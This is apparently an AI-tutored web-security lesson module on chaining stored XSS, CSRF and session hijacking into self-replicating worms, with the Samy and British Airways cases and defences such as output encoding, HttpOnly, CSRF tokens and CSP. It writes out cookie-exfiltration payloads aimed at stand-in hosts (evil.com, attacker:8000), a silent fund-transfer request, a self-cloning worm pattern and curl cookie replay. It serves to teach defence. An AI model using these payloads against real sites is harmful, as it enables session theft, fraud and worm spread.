title: Attack Chaining & XSS Worms
description: Master multi-stage attacks: chain XSS, CSRF, and session hijacking into self-replicating worms that steal data and propagate automatically
learning_outcomes: Understand how individual vulnerabilities combine into devastating attack chains
Build a self-replicating XSS worm from scratch, step by step
Chain Stored XSS with CSRF to perform silent fund transfers
Chain XSS with session hijacking to steal and replay cookies
Analyse real-world worms (Samy, British Airways) and understand their propagation
Implement defences that break every link in the attack chain

ai_tutor_config.personality: Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Treats every question as a good question.

intervention_triggers.idle_40_seconds: Attack chains can feel overwhelming — think of them like building with LEGO blocks. Each vulnerability is one block. Want me to walk through just the first block?
intervention_triggers.idle_90_seconds: Still thinking? That's great — complex attacks need time to understand. Let me break this into smaller pieces. Which part is tricky: the XSS, the CSRF, or how they connect?
intervention_triggers.idle_180_seconds: No rush at all. Let's try a different approach — I'll show you a simple version first, then we'll build up to the full attack. Ready?
intervention_triggers.first_error: Nice try! Attack chains are tricky because each step depends on the previous one. Let's check: does your XSS payload actually execute first?
intervention_triggers.repeated_errors: You're getting closer each time. Let me show you a visual diagram of exactly where the data flows — sometimes seeing the path makes it click.
intervention_triggers.after_success: Brilliant! You just chained two vulnerabilities together — that's real penetration testing skills. Security researchers get paid well for finding these!

encouragement_phrases: You're thinking like a real security researcher now!
That's exactly how the Samy worm worked — same concept!
Each chain link you understand makes you better at defending against them.
This is advanced stuff — the fact you're here means you're serious about security.
Even experienced developers miss these chains — you're learning to spot them.
One more step and you'll have a complete attack chain!
Real penetration testers use exactly these techniques.
You just found a vulnerability that could affect millions of users in the real world.

explanation_styles.analogy: Attack chaining is like a heist movie: one person picks the lock (XSS), another disables the alarm (session steal), and the third grabs the money (CSRF transfer). Each person's job enables the next.
explanation_styles.visual: Follow the arrows in the flowchart: User Input → Database → Other User's Browser → Cookie Stolen → Attacker's Server → curl Replay → Funds Transferred
explanation_styles.step_by_step: Step 1: Inject script into profile. Step 2: Victim visits profile. Step 3: Script steals cookie. Step 4: Script transfers funds. Step 5: Script copies itself to victim's profile. Step 6: Next visitor repeats from Step 2.
explanation_styles.code_trace: Line 1: var x = new XMLHttpRequest() — creates a request object. Line 2: x.open('POST','/transfer') — targets the transfer page. Line 3: x.send('to=999999&amount=500') — sends the money.
explanation_styles.comparison: Single XSS: displays an alert box. Annoying but harmless. Chained XSS+CSRF: silently transfers funds. Dangerous. Chained XSS+CSRF+Worm: transfers funds AND infects the next visitor. Catastrophic.

lessons.title: Attack Chaining & XSS Worms — From Single Exploits to Self-Replicating Attacks

theory.introduction:
Imagine a burglar who can not only break into your house, but also automatically make copies of themselves that break into every house on the street. That's what a self-replicating XSS worm does — it exploits one vulnerability to trigger others, spreading exponentially across a web application.

In 2005, the Samy worm infected over 1 million MySpace profiles in just 20 hours using exactly these techniques. In 2018, attackers injected a script into British Airways' payment page, stealing 380,000 credit card numbers. These weren't simple attacks — they were chains of vulnerabilities working together.

This module teaches you how individual vulnerabilities (XSS, CSRF, session flaws) combine into devastating multi-stage attacks. You'll build a worm step by step, understand every link in the chain, and learn how to defend against them. By the end, you'll think like a real security researcher — someone who sees not just individual bugs, but how they connect.
theory.why_important:
Most security courses teach vulnerabilities in isolation: here's XSS, here's CSRF, here's session hijacking. But real attackers never use just one. They chain them together — using XSS to steal a session, then using that session to perform CSRF, then using CSRF to spread the XSS to more victims.

Understanding attack chains is what separates a beginner from a professional security tester. When you can see how vulnerabilities connect, you can prioritise which ones to fix first — the ones that enable chains are far more dangerous than isolated bugs.

key_concepts.explanation:
Attack chaining means combining two or more vulnerabilities so that exploiting one enables or amplifies another. Think of it like dominoes — pushing the first one (XSS) knocks over the second (cookie theft), which knocks over the third (session hijacking), which knocks over the fourth (fund transfer).

Example chain: Stored XSS → document.cookie → attacker's server → curl replay → unauthorised transfer.

Each vulnerability alone might be rated 'medium risk'. But chained together, they become 'critical'. This is why OWASP and CVSS scoring considers 'attack complexity' — chains that are easy to execute are rated much higher.
key_concepts.ai_hint: Think of each vulnerability as a tool in a toolbox. A screwdriver alone can't build a house, but combined with a hammer, saw, and drill — you can build anything. Attackers think the same way.

key_concepts.concept: Stored XSS — The Foundation of Every Chain
key_concepts.explanation:
Stored (Persistent) XSS is the most dangerous type because the malicious script is saved in the database and executes every time ANY user loads the page. This makes it the perfect 'first domino' in an attack chain.

How it works:
1. Attacker enters <script>malicious code</script> into a form field (e.g., profile description, comment, review)
2. Server stores this in the database WITHOUT sanitising it
3. When another user visits the page, the server sends the stored script as part of the HTML
4. The victim's browser executes it automatically — no click needed

Why it's the perfect chain starter: it needs ZERO interaction from the victim. They just visit a page. The script runs. The chain begins.
key_concepts.ai_hint: Reflected XSS needs the victim to click a dodgy link. Stored XSS just needs them to visit a normal page. That's why stored XSS is the attacker's favourite starting point.

key_concepts.explanation:
XMLHttpRequest (XHR) lets JavaScript send HTTP requests in the background — the user sees nothing. No page reload, no visible form submission, no confirmation dialog. This is how attackers make their chains invisible.

In a legitimate app, XHR powers features like 'auto-save' and 'load more comments'. In an attack, it silently submits forms, transfers funds, or changes passwords — all without the victim knowing.

Key properties:
- Can send POST requests (transfers, profile changes)
- Can set custom headers (Content-Type)
- Runs with the victim's cookies (because it's 'same-origin')
- The victim sees absolutely nothing
key_concepts.ai_hint: XMLHttpRequest is like a ghost employee — it does things using your login credentials, but you never see it working. The server can't tell the difference between a real user clicking 'Transfer' and an XSS script calling XMLHttpRequest.

key_concepts.explanation:
When a website sets a session cookie without the HttpOnly flag, JavaScript can read it using document.cookie. This is the bridge between XSS and session hijacking.

The attack flow:
1. XSS script runs: var cookie = document.cookie;
2. Script sends cookie to attacker: new Image().src = 'http://evil.com/?c=' + cookie;
3. Attacker receives the JSESSIONID value
4. Attacker uses curl or a browser extension to set that cookie
5. Attacker is now 'logged in' as the victim

Why HttpOnly matters:
- HttpOnly = true → document.cookie returns empty string → chain BROKEN
- HttpOnly = false → document.cookie returns 'JSESSIONID=abc123' → chain works

This single flag breaks the entire XSS → session hijacking chain.
key_concepts.ai_hint: Think of the session cookie as a wristband at a concert. If someone photographs your wristband (steals the cookie) and prints a copy, security lets them into the VIP area thinking they're you. HttpOnly is like making the wristband invisible to cameras.

key_concepts.explanation:
A self-replicating script reads its own source code and writes a copy of itself somewhere else. This is what turns a simple XSS into a WORM — an attack that spreads automatically from victim to victim.

The technique:
1. Give the script an id: <script id='clone'>...</script>
2. Read its own content: document.getElementById('clone').innerHTML
3. Reconstruct the full tag: '<script id="clone">' + content + '</script>'
4. Write this into another user's profile using XMLHttpRequest

Now when ANYONE visits the infected profile, the script runs, copies itself to THEIR profile, and the cycle continues. Exponential spread — just like the Samy worm.

The key insight: the script must be able to reconstruct itself EXACTLY. If any part gets encoded or modified during storage/retrieval, the copy won't execute.
key_concepts.ai_hint: A self-replicating script is like a photocopier that can photocopy itself. Put one in a room, and soon every desk has a copy. That one copy makes another, which makes another...

key_concepts.concept: The ajaxSyncRequest Pattern — Using the App Against Itself
key_concepts.explanation:
Many web applications include JavaScript helper functions for their own features — like updating a profile, posting a comment, or saving settings. A clever attacker reuses these existing functions instead of writing their own.

Why this matters:
- The helper function already knows the correct URL, parameters, and encoding
- It handles edge cases the developer thought of
- It doesn't trigger any client-side validation because it's 'trusted' code
- The server accepts the request because it looks exactly like a normal user action

Example: If a banking app has an ajaxSyncRequest() function in Account.js that submits profile updates, an XSS worm can call this function to overwrite profiles — using the app's own code against it.
key_concepts.ai_hint: It's like a burglar who finds the house keys hanging by the front door. Why pick the lock when the owner left the tools right there? Smart attackers reuse what the application provides.

key_concepts.concept: The Samy Worm (2005) — Real-World Case Study
key_concepts.explanation:
On October 4, 2005, Samy Kamkar released what became the fastest-spreading computer worm in history. Within 20 hours, over 1 million MySpace profiles were infected.

What it did:
1. Added 'but most of all, samy is my hero' to every infected profile
2. Added Samy as a friend automatically
3. Copied itself to the viewer's profile

Propagation timeline:
- Hour 0: 1 infected profile (Samy's)
- Hour 1: 73 friends
- Hour 8: ~6,000 profiles
- Hour 13: ~200,000 profiles
- Hour 20: ~1,000,000 profiles
- MySpace taken OFFLINE to stop the spread

The worm worked because MySpace allowed HTML in profiles (stored XSS), had no output encoding, and no CSRF tokens. Sound familiar? These are exactly the same vulnerabilities you're learning about.
key_concepts.ai_hint: Samy went from 1 to 1 million in 20 hours. That's the power of self-replication. Each infected profile becomes a new source of infection — like a biological virus.

key_concepts.concept: British Airways Breach (2018) — Payment Page Injection
key_concepts.explanation:
In 2018, attackers injected 22 lines of JavaScript into British Airways' payment page. For 15 days, every customer who entered their card details had them silently sent to a server controlled by the attackers.

380,000 payment cards were stolen. British Airways was fined 20 million pounds by the UK Information Commissioner's Office (ICO) under GDPR.

The attack was a supply-chain XSS — the attackers compromised a third-party script loaded by the payment page. When the victim typed their card number, the injected script copied each keystroke and sent it to baways.com (a lookalike domain).

Defence that would have prevented it: Content Security Policy (CSP) header restricting which domains scripts can send data to.
key_concepts.ai_hint: The BA attackers didn't need to break into the database. They just added a tiny script to the payment page that copied everything the user typed. Like putting a hidden camera above an ATM keypad.

key_concepts.concept: CSRF Without a Token — Silent Form Submission
key_concepts.explanation:
Cross-Site Request Forgery works when a form has no anti-CSRF token. The attacker creates a hidden form on their own page that auto-submits to the target application. Because the victim's browser automatically includes cookies with every request, the server thinks it's a legitimate action.

In an attack chain, CSRF is typically the 'action' step — the step that actually does damage (transfers money, changes passwords, deletes data). XSS is the 'delivery' step that gets the CSRF payload onto the page.

Why XSS + CSRF is more dangerous than CSRF alone:
- Regular CSRF: attacker must trick victim into visiting a malicious page
- XSS + CSRF: the malicious form is injected INTO the trusted application
- The victim never leaves the bank's website — no suspicious URLs
key_concepts.ai_hint: CSRF alone is like sending a fake letter to the bank with the victim's signature. XSS+CSRF is like the attacker sitting INSIDE the bank, signing documents with the victim's hand. Much harder to stop.

key_concepts.concept: Breaking the Chain — Defence in Depth
key_concepts.explanation:
Every attack chain has multiple links. Breaking ANY ONE link stops the entire chain. This is called Defence in Depth — layered security where each layer catches what the previous one missed.

The XSS worm chain and its defences:
1. XSS injection → DEFENCE: Input sanitisation + output encoding
2. Script execution → DEFENCE: Content Security Policy (CSP)
3. Cookie theft → DEFENCE: HttpOnly flag on session cookies
4. Silent requests → DEFENCE: Anti-CSRF tokens on all forms
5. Worm replication → DEFENCE: Input validation on profile updates

If even ONE of these defences is in place, the entire worm fails:
- Output encoding → script never executes → chain broken at step 1
- HttpOnly → document.cookie returns nothing → no session theft
- CSRF token → XMLHttpRequest transfer rejected → no fund theft
- CSP → browser blocks inline scripts → nothing executes
key_concepts.ai_hint: Defence in depth is like a castle with a moat, walls, archers, AND guards. The enemy might swim across the moat, but then they face the wall. If they climb the wall, the archers are waiting. Any ONE defence can save you.

key_concepts.explanation:
Session hijacking means using someone else's session cookie to impersonate them. The attacker doesn't need the victim's password — they just need the cookie value.

Attack steps:
1. Set up a listener: python3 -m http.server 8000
2. Inject cookie-stealing XSS: <script>new Image().src='http://attacker:8000/?c='+document.cookie</script>
3. Wait for victim to visit the page
4. Read the captured JSESSIONID from server logs
5. Use curl with --cookie flag to make requests as the victim

This works because HTTP is stateless — the server identifies users ONLY by their session cookie. If you have the cookie, you ARE that user as far as the server is concerned.
key_concepts.ai_hint: A session cookie is like a hotel room key card. If someone copies your card, they can enter your room, use the minibar, and charge everything to your bill. The hotel doesn't know it's not you.

key_concepts.explanation:
A complete XSS worm has four components working together:

1. PAYLOAD — The action the worm performs (steal money, steal cookies, deface pages)
2. PROPAGATION — How the worm copies itself to new victims (profile injection)
3. TRIGGER — What causes the worm to execute (page load via stored XSS)
4. STEALTH — How the worm hides its activity (no visible changes, silent requests)

The flow: Victim visits infected page → TRIGGER fires → PAYLOAD executes (steal/transfer) → PROPAGATION writes worm to victim's profile → next visitor triggers the cycle again.

Exponential growth: 1 → 2 → 4 → 8 → 16 → 32 → 64 → 128 → 256 → 512 → 1024 users infected in just 10 rounds of propagation.
key_concepts.ai_hint: A worm is like a chain letter that reads itself, makes copies, and mails them to everyone in your address book. Except this chain letter also empties your bank account.

complete_examples.title: Example 1: Simple Stored XSS — Alert Test
complete_examples.description: The most basic XSS test: inject a script that pops an alert box. This confirms the application is vulnerable to stored XSS.
complete_examples.output: Alert box appears → Stored XSS confirmed. The server stores the raw <script> tag and renders it as HTML.
complete_examples.ai_explanation: This is the 'hello world' of XSS testing. If alert() works, then ANY JavaScript works — including cookie theft, fund transfers, and worm propagation.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 2: Cookie Exfiltration via XSS
complete_examples.description: Upgrade from alert to actual data theft: use document.cookie to display the session cookie, proving HttpOnly is not set.
complete_examples.output: JSESSIONID=node0abc123... displayed in alert → HttpOnly=false confirmed → session can be stolen via XSS
complete_examples.ai_explanation: If this alert shows a JSESSIONID, the entire session hijacking chain is possible. One missing flag (HttpOnly) enables a complete attack.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 3: Cookie Theft to Remote Server
complete_examples.description: Send the stolen cookie to an attacker-controlled server instead of just displaying it.
complete_examples.output: Attacker's server log shows the JSESSIONID value → cookie successfully exfiltrated without victim's knowledge
complete_examples.ai_explanation: The Image() trick works because browsers load images from any domain — no Same-Origin restriction. The 'image' never actually loads, but the request is sent.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 4: Session Hijacking with curl
complete_examples.description: Use a stolen JSESSIONID cookie to make authenticated requests as the victim.
complete_examples.output: curl returns victim's account details and successfully transfers funds → complete session hijacking
complete_examples.ai_explanation: This is the 'proof of concept' that completes the chain: XSS → cookie theft → curl replay → unauthorised action. Three vulnerabilities, one devastating result.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 5: Hidden CSRF Form in XSS
complete_examples.description: Combine XSS and CSRF: inject a hidden form that auto-submits a fund transfer.
complete_examples.output: Funds transferred silently when victim loads the page → XSS + CSRF chain successful
complete_examples.ai_explanation: XMLHttpRequest is always better than hidden forms for attack chains because: (1) no page redirect, (2) no nested form issues, (3) completely silent.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 6: The Clone Script — Self-Reading Code
complete_examples.description: Build the foundation of a worm: a script that can read and reconstruct its own source code.
complete_examples.output: Alert displays the complete reconstructed script source code → self-reading ability confirmed → ready for worm propagation
complete_examples.ai_explanation: This is the critical building block. If a script can read itself, it can write itself into another user's profile. That's the difference between a one-time attack and a self-replicating worm.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 7: Worm Propagation via Profile Injection
complete_examples.description: Use the clone technique to write the worm into the victim's profile, enabling propagation.
complete_examples.output: Victim's profile now contains the worm → next visitor will be infected → exponential propagation enabled
complete_examples.ai_explanation: The encoding problem is the #1 reason worms fail. If the clone gets URL-encoded (%3Cscript%3E), it becomes visible text, not executable code. Using the app's own update function solves this.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 8: Combined Worm: Steal + Transfer + Replicate
complete_examples.description: The complete worm that performs all three actions simultaneously.
complete_examples.output: Funds stolen + cookie exfiltrated + worm propagated to victim's profile → complete attack chain in one payload
complete_examples.ai_explanation: This is the most advanced XSS attack possible. It chains four vulnerabilities (stored XSS, missing CSRF token, HttpOnly=false, no input validation) into a self-replicating worm.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 9: Defence: Output Encoding
complete_examples.description: The #1 defence against XSS — encode output so scripts display as text instead of executing.
complete_examples.output: Script displayed as visible text '<script>alert(1)</script>' instead of executing → XSS prevented → entire chain broken at step 1
complete_examples.ai_explanation: Output encoding is the single most effective defence. It breaks the chain at the very first step — if the script never executes, nothing else in the chain can happen.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 10: Defence: HttpOnly and Secure Cookies
complete_examples.description: Set cookie flags to prevent JavaScript access and network interception.
complete_examples.output: document.cookie returns empty string → session cookie invisible to JavaScript → session hijacking chain broken
complete_examples.ai_explanation: Three flags, three layers of protection: HttpOnly stops JavaScript theft, Secure stops network sniffing, SameSite stops cross-site request attachment.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 11: Defence: CSRF Tokens
complete_examples.description: Add anti-CSRF tokens to break the fund transfer step of the chain.
complete_examples.output: XMLHttpRequest transfer returns 403 Forbidden → CSRF token validation rejects the request → fund theft prevented
complete_examples.ai_explanation: The XSS worm can steal cookies and replicate, but it CANNOT transfer funds if there's a CSRF token — because the token is unique per session and the worm doesn't know its value.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

complete_examples.title: Example 12: Defence: Content Security Policy
complete_examples.description: Use CSP headers to block inline script execution entirely.
complete_examples.output: Browser console shows 'Refused to execute inline script' → CSP blocks ALL injected scripts → worm cannot execute at all
complete_examples.ai_explanation: CSP is the strongest defence because it works even when output encoding fails. The browser itself enforces the policy — no inline script can execute, period.
complete_examples.ai_challenge: Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step.

visual_diagram.title: Attack Chain & XSS Worm — Complete Flow
visual_diagram.content:
ATTACK CHAIN FLOWCHART
PHASE 1: INJECTION
▶ Attacker logs in as admin ▶ Opens profile page (/account) ▶ Types <script id=\"worm\">...</script> in description field ▶ Clicks save → payload stored in database WITHOUT sanitisation
↓ ↓ ↓
PHASE 2: TRIGGER
▶ Victim (user1) visits attacker's profile (?username=admin) ▶ Server loads profile from database ▶ Script tag rendered as HTML → browser EXECUTES it ▶ Worm is now running in victim's browser with victim's session
↓ ↓ ↓
PHASE 3: PAYLOAD (3 simultaneous actions)
ACTION A Cookie Theft: new Image().src = 'http://evil.com/?c=' + document.cookie → JSESSIONID sent to attacker's server (HttpOnly=false!) ACTION B Fund Transfer: XMLHttpRequest POST /transfer {to: 999999, amount: 500} → 500$ stolen from victim (no CSRF token!) ACTION C Self-Replication: ajaxSyncRequest('/account', wormClone) → Worm copied to victim's profile
↓ ↓ ↓
PHASE 4: PROPAGATION (exponential)
▶ User2 visits user1's profile → infected! → worm copies to user2's profile ▶ User3 visits user2's profile → infected! → worm copies to user3's profile ▶ Growth: 1 → 2 → 4 → 8 → 16 → 32 → 64 → 128 → 1,000,000+
BREAKING THE CHAIN — Any ONE defence stops it all:
✔ Output Encoding → <script> becomes <script> → never executes ✔ CSP Header → script-src 'self' blocks inline scripts ✔ HttpOnly Cookie → document.cookie returns nothing ✔ CSRF Token → XMLHttpRequest transfer REJECTED ✔ Input Validation → script tags stripped on save
Remember: The Samy worm used this EXACT pattern and infected 1 million profiles in 20 hours. Defence in depth means every layer catches what the last one missed.
